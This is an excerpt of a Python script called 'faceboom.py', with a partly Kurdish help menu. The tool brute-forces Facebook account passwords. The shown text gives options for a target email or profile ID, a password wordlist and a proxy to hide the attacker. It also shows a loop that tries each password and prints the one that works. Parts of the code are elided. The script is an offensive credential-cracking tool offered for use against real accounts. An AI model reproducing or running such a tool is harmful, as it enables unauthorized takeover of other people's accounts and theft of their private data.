...
OPTIONS:
       |
    |--------
    | -t <target email> [OR] <FACEBOOK ID>    ::> Email Kaska dany Yaxud Profile ID
    |--------
    | -w <wordlist Path>                      ::> File Password 
    |--------
    | -s <single password>                    ::> Single Password Test
    |--------
    | -p <Proxy IP:PORT>                      ::> Bo gorene shwen xot HTTP/S Proxy (Optional)
    |--------
    | -g <TARGET Facebook Profile URL>        ::> agr hich la sar kaska nazani link Facebook Profile URL ID dany
    |--------
    | -u/--update                             ::> Update a7aapasha Script
-------------
Examples:
        |
     |--------
     ...
     |--------
     | python faceboom.py -g https://www.facebook.com/a7aapasha
     |--------
""")
   ...
   if update:
    ...
    sys.exit(1)
        ...
        for passwd in passwords:
                ...
                write(wi+"["+yl+str(loop)+wi+"] Password Test Dakat[ {"+yl+str(passwd)+wi+"} ]")
                retCode = faceboom.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Password Dozraywa :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
